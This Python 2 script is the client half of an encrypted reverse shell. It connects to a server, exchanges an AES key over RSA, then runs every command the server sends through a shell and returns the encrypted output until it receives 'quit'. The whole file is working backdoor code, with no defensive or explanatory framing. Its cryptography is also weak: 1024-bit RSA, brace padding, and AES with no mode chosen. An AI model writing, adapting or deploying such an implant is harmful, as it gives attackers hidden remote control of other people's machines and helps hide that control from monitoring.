import socket,subprocess
from Crypto.Cipher import AES
import base64

import Crypto
from Crypto.PublicKey import RSA
from Crypto import Random
import ast
from Crypto.Util import asn1
from base64 import b64decode

random_generator = Random.new().read
key = RSA.generate(1024, random_generator) #generate pub and priv key
binPrivKey = key.exportKey('DER')
binPubKey =  key.publickey().exportKey('DER')
#publickey = key.publickey() # pub key export for exchange
privKeyObj = RSA.importKey(binPrivKey)
pubKeyObj =  RSA.importKey(binPubKey)

################ AES algorithm variables and padding ##########################
BLOCK_SIZE = 32 #define AES block size 
PADDING = '{'  #padding character to be used for enc/dec
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING #pad the text to be encrypted with sufficient number of '{' chars

#encrypt/encode and decrypt/decode the string
#AES for encryption/decryption and base64 for encode/decode
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s))) #first encrypt then encode
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING) #first decode then decrypt

#secret = 32*'a' #secret key

###############################################################################


HOST='127.0.0.1' #server ip our client will connect to
PORT=459 #port number to connect to

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) #create a client socket object
s.connect((HOST,PORT)) #connect to the (host,port) of the server 

################## Key Exchange ################################
s.send(binPubKey)#send binary public key
data=s.recv(1024)#recv the secret key in encrypted form
secret=privKeyObj.decrypt(data)#decrypt the encrypted key recvd
################################################################
print secret
cipher=AES.new(str(secret))  #creating an AES cipher object
encrypted=EncodeAES(cipher,"connected") # encrypt the ACK message and send!
s.send(encrypted)

while 1:
	data = s.recv(2048) #recv command from the server
	data = DecodeAES(cipher, data)#decoded the command recvd!
	if data == "quit" : break
	
	
	proc=subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE) #execute the command supplied by server
	stdoutput = proc.stdout.read() + proc.stderr.read() #output of the command taken into stdoutput variable
	
	encrypted=EncodeAES(cipher,stdoutput)#encrypt the command output and send back to the server
	s.send(encrypted)
	
#exit the loop
encrypted=EncodeAES(cipher,"bye") #when loop breaks (ie: when data recvd == quit) send "bye"(encrypted) back to the server
s.send(encrypted)
s.close()#close the socket
